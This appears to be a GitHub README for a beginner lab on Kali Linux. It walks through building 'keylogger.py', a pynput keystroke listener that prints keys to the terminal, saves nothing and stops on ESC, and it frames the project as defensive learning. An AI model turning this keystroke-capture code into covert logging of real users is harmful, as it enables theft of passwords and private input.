# Beginner Cybersecurity Projects – Hands-on Lab (Kali Linux)

This repository documents two beginner-friendly cybersecurity projects implemented in a **controlled lab environment** using **Kali Linux on VMware Workstation**.  
All steps are documented **exactly as executed**, including directory creation, virtual environments, commands, and source code.

Projects included:
1. Educational Key Capture Analysis Tool
2. Password Strength Assessment Tool

---

## 🖥️ Lab Environment
- OS: Kali Linux (VMware Workstation)
- Python Version: 3.13.7
- Shell: Bash
- Purpose: Educational & defensive cybersecurity learning

---

# 🔐 Project 1: Educational Key Capture Analysis Tool

## 📌 Objective
To understand how keystroke interception works at the OS level so that such attacks can be **detected and prevented**.  
This implementation is **non-stealth**, **non-persistent**, and **prints output only to the terminal**.

---

## 📂 Step-by-Step Execution (Exact Commands)

### 1️⃣ Verify Python Installation
```bash
python --version
2️⃣ Create Main Project Directory
bash
Copy code
mkdir cyberprojects
cd cyberprojects
3️⃣ Create Keylogger Project Directory
bash
Copy code
mkdir keylogger
cd keylogger
4️⃣ Create Virtual Environment
bash
Copy code
python -m venv venvi1
5️⃣ Activate Virtual Environment
bash
Copy code
source venvi1/bin/activate
Terminal prompt changes to:

scss
Copy code
(venvi1)
6️⃣ Install Required Library
bash
Copy code
pip install pynput
7️⃣ Create Python File
bash
Copy code
touch keylogger.py
nano keylogger.py
🧾 Source Code Used (keylogger.py)
python
Copy code
from pynput import keyboard

def on_press(key):
    try:
        print(f"Key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("ESC pressed. Exiting key capture.")
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    print("Key capture started (Press ESC to stop)")
    listener.join()
Save and exit nano:

CTRL + O → Enter

CTRL + X

8️⃣ Run the Program
bash
Copy code
python keylogger.py
▶️ Observed Behavior
Keystrokes are printed live in the terminal

Special keys (Space, Enter, ESC) are captured

Pressing ESC safely terminates execution

🧠 Learning Outcomes
Keyboard hooks and input interception

Keystroke-based attack awareness

Endpoint detection concepts (EDR/AV)

Ethical boundaries in security research
